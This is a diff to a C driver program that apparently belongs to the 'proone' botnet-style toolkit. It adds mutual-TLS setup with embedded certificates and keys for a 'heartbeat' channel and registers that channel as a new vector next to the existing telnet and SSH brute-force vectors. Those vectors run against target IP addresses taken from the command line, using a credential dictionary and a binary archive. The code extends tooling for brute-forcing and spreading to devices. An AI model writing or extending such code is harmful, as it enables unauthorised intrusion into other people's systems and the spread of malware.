@@ -1,4 +1,6 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <assert.h>
 #include <string.h>
 #include <errno.h>
 
@@ -11,6 +13,8 @@
 #include "util_rt.h"
 #include "bne.h"
 #include "llist.h"
+#include "mbedtls.h"
+#include "proone_conf/x509.h"
 
 
 static void print_help (FILE *o, const char *prog) {
@@ -62,6 +66,37 @@ static bool load_file (const int fd, uint8_t **m, size_t *len) {
 
 	prne_free(buf);
 	return ret;
+}
+
+static void load_htbt_ssl_conf (
+	mbedtls_x509_crt *ca,
+	mbedtls_x509_crt *crt,
+	mbedtls_pk_context *key,
+	mbedtls_ssl_config *conf,
+	mbedtls_ctr_drbg_context *rnd)
+{
+	static const char *ALP_LIST[] = { PRNE_HTBT_TLS_ALP, NULL };
+	static const uint8_t
+		CA_CRT[] = PRNE_X509_CA_CRT,
+		CRT[] = PRNE_X509_C_CRT,
+		KEY[] = PRNE_X509_C_KEY;
+
+	assert(mbedtls_x509_crt_parse(ca, CA_CRT, sizeof(CA_CRT)) == 0);
+
+	assert(
+		mbedtls_ssl_config_defaults(
+			conf,
+			MBEDTLS_SSL_IS_CLIENT,
+			MBEDTLS_SSL_TRANSPORT_STREAM,
+			MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
+		mbedtls_x509_crt_parse(crt, CRT, sizeof(CRT)) == 0 &&
+		mbedtls_pk_parse_key(key, KEY, sizeof(KEY), NULL, 0) == 0 &&
+		mbedtls_ssl_conf_own_cert(conf, crt, key) == 0);
+	assert(mbedtls_ssl_conf_alpn_protocols(conf, ALP_LIST) == 0);
+	mbedtls_ssl_conf_ca_chain(conf, ca, NULL);
+	mbedtls_ssl_conf_verify(conf, prne_mbedtls_x509_crt_verify_cb, NULL);
+	mbedtls_ssl_conf_rng(conf, mbedtls_ctr_drbg_random, rnd);
+	mbedtls_ssl_conf_authmode(conf, MBEDTLS_SSL_VERIFY_REQUIRED);
 }
 
 static void report_result (const prne_bne_result_t *r) {
@@ -122,6 +157,7 @@ static char *cb_exec_name (void) {
 
 int main (const int argc, const char **args) {
 	static prne_bne_vector_t ARR_VEC[] = {
+		PRNE_BNE_V_HTBT,
 		PRNE_BNE_V_BRUTE_TELNET,
 		PRNE_BNE_V_BRUTE_SSH
 	};
@@ -139,12 +175,24 @@ int main (const int argc, const char **args) {
 	prne_pack_rc_t prc;
 	mbedtls_entropy_context entropy;
 	mbedtls_ctr_drbg_context ctr_drbg;
+	struct {
+		mbedtls_x509_crt ca;
+		mbedtls_x509_crt crt;
+		mbedtls_pk_context key;
+		mbedtls_ssl_config conf;
+	} htbt_ssl;
 	pth_event_t ev_root = NULL;
 	prne_llist_t wkr_list;
 
 	prne_init_cred_dict(&dict);
 	prne_init_bne_param(&param);
 	prne_init_bin_archive(&ba);
+
+	mbedtls_x509_crt_init(&htbt_ssl.ca);
+	mbedtls_x509_crt_init(&htbt_ssl.crt);
+	mbedtls_pk_init(&htbt_ssl.key);
+	mbedtls_ssl_config_init(&htbt_ssl.conf);
+
 	mbedtls_entropy_init(&entropy);
 	mbedtls_ctr_drbg_init(&ctr_drbg);
 	prne_init_llist(&wkr_list);
@@ -164,6 +212,13 @@ int main (const int argc, const char **args) {
 		ret = 2;
 		goto END;
 	}
+
+	load_htbt_ssl_conf(
+		&htbt_ssl.ca,
+		&htbt_ssl.crt,
+		&htbt_ssl.key,
+		&htbt_ssl.conf,
+		&ctr_drbg);
 
 	cnt = (size_t)argc - 3;
 	arr = (prne_ip_addr_t*)prne_calloc(sizeof(prne_ip_addr_t), cnt);
@@ -235,6 +290,7 @@ int main (const int argc, const char **args) {
 		goto END;
 	}
 
+	param.htbt_ssl_conf = &htbt_ssl.conf;
 	param.cred_dict = &dict;
 	param.vector.arr = ARR_VEC;
 	param.vector.cnt = sizeof(ARR_VEC)/sizeof(prne_bne_vector_t);
@@ -314,6 +370,10 @@ END: // CATCH
 	pth_event_free(ev_root, TRUE);
 	mbedtls_ctr_drbg_free(&ctr_drbg);
 	mbedtls_entropy_free(&entropy);
+	mbedtls_x509_crt_free(&htbt_ssl.ca);
+	mbedtls_x509_crt_free(&htbt_ssl.crt);
+	mbedtls_pk_free(&htbt_ssl.key);
+	mbedtls_ssl_config_free(&htbt_ssl.conf);
 	prne_free_cred_dict(&dict);
 	prne_free_bne_param(&param);
 	prne_free_bin_archive(&ba);
